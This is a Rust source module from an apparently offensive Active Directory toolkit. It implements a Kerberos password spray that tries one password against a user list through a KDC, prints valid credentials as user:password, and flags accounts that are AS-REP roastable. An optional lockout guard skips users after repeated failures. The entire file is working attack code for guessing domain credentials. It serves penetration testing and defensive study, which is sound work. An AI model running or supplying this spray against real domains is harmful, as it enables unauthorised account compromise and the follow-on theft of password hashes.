//! Kerberos password spray: one password across a user list, classified by the
//! KDC response (valid / expired / disabled / AS-REP roastable / invalid).

use anyhow::{Context, Result};
use clap::Parser;
use std::collections::HashMap;
use std::time::Instant;

use crate::ui;

#[derive(Parser)]
pub(crate) struct SprayArgs {
    /// KDC `host[:port]`
    #[arg(long)]
    pub kdc: String,
    /// Kerberos realm, e.g. CORP.LOCAL
    #[arg(long)]
    pub realm: String,
    /// Users: comma-separated list, or @file with one per line
    #[arg(long)]
    pub users: String,
    /// Single password to spray across all users
    #[arg(long, default_value = "")]
    pub password: String,
    /// Stop targeting a user after N failed attempts within --lockout-window.
    /// Prevents accidentally locking accounts on a domain with an aggressive
    /// lockout policy. 0 = no lockout guard (default).
    #[arg(long, default_value_t = 0)]
    pub lockout_threshold: u32,
    /// Sliding window in seconds for --lockout-threshold. Ignored if threshold=0.
    #[arg(long, default_value_t = 300)]
    pub lockout_window: u64,
}

/// Kerberos password spray: one password across a user list, classified by KDC response.
///
/// Wraps `spray_impl` with a rich per-stage checklist so the run-end card breaks the
/// operation into "resolve password → load user list → spray → summary" instead of a
/// single opaque "execute action" line. Failure at any stage lands as
/// `mark_current_failed` on that stage, so the operator sees exactly where the pipeline
/// stopped (bad users file vs bad KDC vs bad password).
pub(crate) async fn spray(a: SprayArgs) -> Result<()> {
    let mut checklist = ui::StageChecklist::new([
        "resolve password",
        "load user list",
        "spray against KDC",
        "summary",
    ]);
    let result = spray_impl(a, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("Spray stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("Spray stages (failed)");
        }
    }
    result
}

async fn spray_impl(mut a: SprayArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
    use adhammer_kerberos::{check_credential, CredResult};
    a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
    checklist.record_ok(
        "resolve password",
        if a.password.is_empty() {
            "empty — AS-REP-only mode"
        } else {
            "resolved"
        },
    );

    let users: Vec<String> = if let Some(path) = a.users.strip_prefix('@') {
        std::fs::read_to_string(path)
            .with_context(|| format!("read users list {path}"))?
            .lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect()
    } else if std::path::Path::new(&a.users).is_file() {
        // Path passed without `@` prefix — a common gotcha. Treat as a file with a hint.
        eprintln!(
            "[!] `--users {}` looks like a file path — use `--users @{}` to read it as a list. Treating the arg as one user name.",
            a.users, a.users
        );
        vec![a.users.clone()]
    } else {
        a.users
            .split(',')
            .map(|u| u.trim().to_string())
            .filter(|u| !u.is_empty())
            .collect()
    };

    if users.is_empty() {
        anyhow::bail!("no users to spray (empty --users)");
    }
    checklist.record_ok("load user list", format!("{} user(s)", users.len()));
    eprintln!(
        "[*] spraying {} user(s) against {} @ {} …",
        users.len(),
        a.realm,
        a.kdc
    );
    let (mut valid, mut asrep, mut disabled, mut other) = (0u32, 0u32, 0u32, 0u32);
    // Lockout guard: per-user failure timestamps, purged on each attempt.
    let window = std::time::Duration::from_secs(a.lockout_window);
    let mut failures: HashMap<String, Vec<Instant>> = HashMap::new();
    let mut guarded: u32 = 0;
    for u in &users {
        if a.lockout_threshold > 0 {
            let hits = failures.entry(u.clone()).or_default();
            let now = Instant::now();
            hits.retain(|t| now.duration_since(*t) < window);
            if hits.len() as u32 >= a.lockout_threshold {
                guarded += 1;
                eprintln!(
                    "[!] skipping {u} — hit lockout guard ({} failures in last {}s)",
                    hits.len(),
                    a.lockout_window
                );
                continue;
            }
        }
        match check_credential(u, &a.password, &a.realm, &a.kdc).await {
            Ok(CredResult::Valid) => {
                valid += 1;
                println!("[+] VALID           {u}:{}", a.password);
            }
            Ok(CredResult::ValidButExpired) => {
                valid += 1;
                println!("[+] VALID (expired) {u}:{}", a.password);
            }
            Ok(CredResult::Disabled) => {
                disabled += 1;
                println!("[-] disabled/locked {u}");
            }
            Ok(CredResult::NoPreAuth) => {
                asrep += 1;
                println!("[*] AS-REP roastable {u} (no pre-auth)");
            }
            Ok(CredResult::Invalid) => {
                if a.lockout_threshold > 0 {
                    failures.entry(u.clone()).or_default().push(Instant::now());
                }
                // still quiet — the norm
            }
            Ok(CredResult::NoSuchUser) => {} // quiet — the norm
            Ok(CredResult::Other(c)) => {
                other += 1;
                eprintln!("    {u}: KDC error {c}");
            }
            Err(e) => {
                other += 1;
                eprintln!("    {u}: {e}");
            }
        }
    }
    eprintln!(
        "[*] spray done: {}/{} valid, {} AS-REP roastable, {} disabled, {} other error(s)",
        valid,
        users.len(),
        asrep,
        disabled,
        other
    );
    if a.lockout_threshold > 0 && guarded > 0 {
        eprintln!(
            "[*] lockout guard triggered on {guarded} user(s) ({}/{}s threshold)",
            a.lockout_threshold, a.lockout_window
        );
    }
    // Spray-against-KDC always completes if we got here — even if 0 users matched, we
    // successfully talked to the KDC. Report the outcome shape.
    checklist.record_ok(
        "spray against KDC",
        format!("{valid} valid · {asrep} AS-REP · {disabled} disabled · {other} error(s)"),
    );
    checklist.record_ok(
        "summary",
        if a.lockout_threshold > 0 {
            format!("lockout guard: {guarded} skipped")
        } else {
            "no lockout guard".to_string()
        },
    );
    Ok(())
}
